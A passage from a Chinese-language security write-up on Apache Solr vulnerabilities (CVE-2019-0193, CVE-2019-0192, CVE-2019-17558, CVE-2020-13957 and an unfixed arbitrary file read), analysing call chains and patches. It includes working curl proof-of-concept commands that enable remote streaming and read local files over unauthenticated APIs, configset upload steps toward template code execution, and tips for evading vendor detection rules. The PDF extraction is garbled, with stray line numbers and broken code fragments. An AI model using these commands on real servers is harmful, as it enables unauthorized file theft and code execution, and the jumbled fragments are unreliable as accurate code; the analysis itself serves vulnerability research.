具体看org.apache.solr.schema.FileExchangeRateProvider修复，都换成SafeXMLParsing了
2.6 CVE-2019-0193
2.6.1 复现
POC:
1
2
6
7
12
13
14
1
2
3
'${dataimporter.last_index_time}'">
5
6
7
             '${dataimporter.last_index_time}'"
10
                    parentDeltaQuery="select ID from item where 
ID=${feature.ITEM_ID}">
11
12
13
14
             '${dataimporter.last_index_time}'"
17
                    parentDeltaQuery="select ID from item where 
ID=${item_category.ITEM_ID}">
18
                 '${dataimporter.last_index_time}'"
21
entity 标签中⽀持执⾏script，且⽀持jndi，也就是漏洞触发的地⽅，具体dataimport⽀持的
功能参阅官⽅⽂档https://solr.apache.org/guide/8_6/uploading-structured-data-store-d
ata-with-the-data-import-handler.html
补丁增加了
enable.dih.dataConﬁgParam（默认为false）只有启动solr的时候加上参数-
Denable.dih.dataConﬁgParam=true 才会被设置为true。利⽤失败如下
2.7 CVE-2019-0192
2.7.1 复现
https://github.com/mpgn/CVE-2019-0192/
2.7.2 分析
Solr⽀持动态的更新配置，但是更新的并不是Solrconﬁg.xml ⽽是conﬁgoverlay.json
官⽅⽂档参考如下
Conﬁg API可以使⽤类似REST的API调⽤来处理您的solrconﬁg.xml的各个⽅⾯。
                        parentDeltaQuery="select ITEM_ID, CATEGORY_ID from 
item_category where CATEGORY_ID=${category.ID}">
22
23
24
25
26
27
28
此功能默认启⽤，并且在SolrCloud和独⽴模式下的⼯作⽅式类似。许多通常编辑的属性
（如缓存⼤⼩和提交设置）和请求处理程序定义可以使⽤此API进⾏更改。
使⽤此API时，solrconﬁg.xml不会更改。相反，所有编辑的配置都存储在⼀个名为
conﬁgoverlay.json的⽂件中。该conﬁgoverlay.json中值覆盖solrconﬁg.xml中的值。
所以加载core的时候⾃然会加载conﬁgoverlay.json⽂件，问题也出在这⾥，精⼼构造的
conﬁgoverlay.json可以触发org.apache.solr.core.SolrConﬁg的危险构造⽅法
进⽽触发org.apache.solr.core.SolrCore#initInfoRegistry
修复，新版本直接不⽀持jmx
2.8 CVE-2019-17558
2.8.1 复现
public SolrConfig(SolrResourceLoader loader, String name, InputSource is) 
throws ParserConfigurationException, IOException, SAXException {......}
1
2.8.2 分析
Velocity模板引擎注⼊⾸先触发的话，需要通过conﬁg api开启模板引擎开关
params.resource.loader.enabled，Solr提供给管理员⽅便管理的配置api，正常功能，由于
Solr默认安装为未授权，所以攻击者可以直接配置
再看下模板命令执⾏，是返回内容进⾏模板渲染的时候发⽣的代码注⼊
org.apache.solr.servlet.HttpSolrCall#writeResponse
org.apache.solr.response.QueryResponseWriterUtil#writeQueryResponse
最后进⼊到模板引擎渲染阶段 org.apache.solr.response.VelocityResponseWriter#write
此时部分调⽤炸
2.9 CVE-2020-13957
官⽅API参考⽂档
https://lucene.apache.org/solr/guide/8_4/conﬁgsets-api.html#conﬁgsets-api
⾸先准备配置⽂件
修改solrconﬁg.xml  velocity.params.resource.loader.enabled:false 为true
⽬录如下
write:151, VelocityResponseWriter (org.apache.solr.response)
1
writeQueryResponse:65, QueryResponseWriterUtil (org.apache.solr.response)
2
writeResponse:732, HttpSolrCall (org.apache.solr.servlet)
3
call:473, HttpSolrCall (org.apache.solr.servlet)
4
doFilter:345, SolrDispatchFilter (org.apache.solr.servlet)
5
docker cp c3:/opt/solr-8.2.0/server/solr/configsets/_default/conf ./
1
压缩为zip，通过Conﬁgset API上传到服务器
配置⽂件上传成功
通过API创建新的collecton，或者从前台创建也可
创建成功
curl -X POST --header "Content-Type:application/octet-stream" --data-
binary @sssconfigset.zip "http://localhost:8983/solr/admin/configs?
action=UPLOAD&name=sssConfigSet"
1
执⾏命令
其实是官⽅正常功能
2.10 全版本任意⽂件读取(官⽅拒绝修复)
默认安装未授权情况下，各项配置皆为默认
下载Solr最新版本
http://archive.apache.org/dist/lucene/solr/8.80/solr-8.8.0.tgz
POC
curl -d '{  "set-property" : 
{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' 
http://192.168.33.130:8983/solr/db/config -H 'Content-
type:application/json'
1
复现
1.第⼀步
2.第⼆步
3.漏洞信息跟进
https://cwiki.apache.org/conﬂuence/display/solr/SolrSecurity
2
curl "http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams" 
-F "stream.url=file:///C:/a.txt" 
3
curl -d '{  "set-property" : 
{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' 
http://192.168.33.130:8983/solr/db/config -H 'Content-
type:application/json'
1
curl "http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams" 
-F "stream.url=file:///C:/a.txt" 
1
https://issues.apache.org/jira/browse/SOLR
4.⼚商防护及绕过思路
这种组件直接放内⽹就好了，或者⼀定配置身份校验，且Solr路由写的⽐较死，⼚商提取规则
时只要将url过滤完整即可，不会存在绕过情况。
绕过的话，虽然说每个漏洞url较为固定，但是每个功能的触发点皆为每个core或collection，
core的名称包含在url中，且⽣产环境中为⽤户⾃定义，很多规则编写者通常只将示例example
加⼊检测，可绕过⼏率很⾼。
四、个⼈思考
Apache Solr整体默认安装为未授权，且⼤部分资产都为未授权，提供众多api接⼝，⽀持未授
权⽤户通过conﬁg api更改配置⽂件，攻击⾯较⼤。
五、参考链接
https://solr.apache.org/guide/8_6/
https://caiqiqi.github.io/2019/11/03/Apache-Solr%E6%BC%8F%E6%B4%9E%E5%9
0%88%E9%9B%86/
https://baike.baidu.com/item/apache%20solr
https://cwiki.apache.org/conﬂuence/display/solr/SolrSecurity
https://www.jianshu.com/p/03b1199dec2c
https://zhuanlan.zhihu.com/p/71629409
https://issues.apache.org/jira/browse/SOLR-12770
https://xz.aliyun.com/t/8374
https://www.ebounce.cn/web/73.html
https://developer.aliyun.com/article/616505
https://www.jianshu.com/p/d3d83b6cb17c
https://www.cnblogs.com/leeSmall/p/8992708.html
https://zhouj000.github.io/2019/01/24/solr-6/
https://juejin.im/post/6844903949116391431
http://codingdict.com/article/9427
https://xz.aliyun.com/t/2448
https://xz.aliyun.com/t/1523#toc-1
https://paper.seebug.org/1009/
https://xz.aliyun.com/t/4422